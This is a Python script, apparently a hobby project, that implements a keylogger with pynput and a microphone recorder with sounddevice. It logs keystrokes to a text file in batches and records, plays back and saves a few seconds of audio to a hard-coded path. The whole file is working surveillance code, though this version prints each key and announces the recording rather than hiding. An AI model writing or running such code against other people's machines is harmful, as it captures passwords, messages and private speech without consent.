#!/bin/python

#-----------Imports

#For basic keylogging
import pynput
from pynput.keyboard import Key, Listener

#For microphone
import sounddevice as sd
import numpy as np
import scipy.io.wavfile as wav
from scipy.io.wavfile import write

#For the little animations
import sys, time, itertools
#-------------------

#------------Variables

#For basic keylogging

count = 0 #If the user is somehow able to break out of the program, after the user hits a certain amount of keys, the user will be able to add the data into the files
count_space = 0
keys = []

#For microphone
microphone_time = 5

audio_information = "audio.wav"
file_path = "/home/yoshi/Desktop/Projects/Mini/keylogger"
extend = "/"

#For the dot animation
count = 0


#----------------------

#Basic Keylogging
#Listener is what listens to the key events

def on_press(key):
    
    global keys, count

    keys.append(key)
    
    count += 1
    
    print("{0} pressed".format(key))
    
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(key):

    global count_space
    with open("log.txt", "a") as f:
        for key in keys:
           
            k = str(key).replace("'", "")
            
            if k.find("space") > 0: #key.space is returned when space is pressed, that is why we use space                    
                count_space += 1
                
                if (count_space > 1):
                    continue
                else:
                    f.write('\n')
            
            elif k.find("Key") == -1:
                f.write(k)
                count_space = 0

def on_release(key):

    with open("log.txt", "a") as f:
        if key == Key.esc:
            f.write("\n")
            return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join() #This loop is constantly run till we exit from it

#The basic dot animation
def animate():
    global count
    for c in itertools.cycle(['.', '..', '...','   ']):
        if count == 10:
            break
        sys.stdout.write('\rRecording audio' + c)
        time.sleep(1) 
        count += 1
       
    for x in range(0, 3):
        sys.stdout.write('\rRecording Complete!')
        time.sleep(0.5)
        sys.stdout.write('\r                   ')
        time.sleep(0.5)

#Collecting and storing the audio


def microphone():
    fs = 44100
    duration = microphone_time
    
    myrecording = sd.rec(int(duration*fs), samplerate=fs, channels=2)

    animate()

    sd.wait()

    sd.play(myrecording, fs)
    sd.wait()
    print("\nPlaying audio complete")

    write(file_path + extend + audio_information, fs, myrecording)

microphone()
